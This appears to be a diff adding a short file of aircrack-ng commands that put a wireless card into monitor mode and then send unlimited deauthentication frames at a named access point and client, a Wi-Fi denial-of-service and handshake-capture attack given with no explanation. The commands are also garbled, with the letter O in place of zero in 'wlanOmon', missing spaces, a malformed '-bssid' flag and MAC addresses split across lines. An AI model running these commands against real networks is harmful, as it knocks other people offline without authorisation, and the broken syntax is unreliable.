@@ -1,0 +1,15 @@
+sudo airmon-ng start wlan0
+
+sudo airmon-ng check kill
+
+sudo airodump-ng wlanOmon
+
+sudo airmon-ng start wlanOmon 11
+
+sudo aireplay-ng-0 0-a C6:25:06:57:99:0E wlanOmon
+
+sudo airodump-ng-c 11 -bssid C6:25:06:57:99:0E
+wlanOmon
+
+sudo aireplay-ng-0 0-a C6:25:06:57:99:0E -c 90:C1:15:1C:
+85:C0 wlanOmon
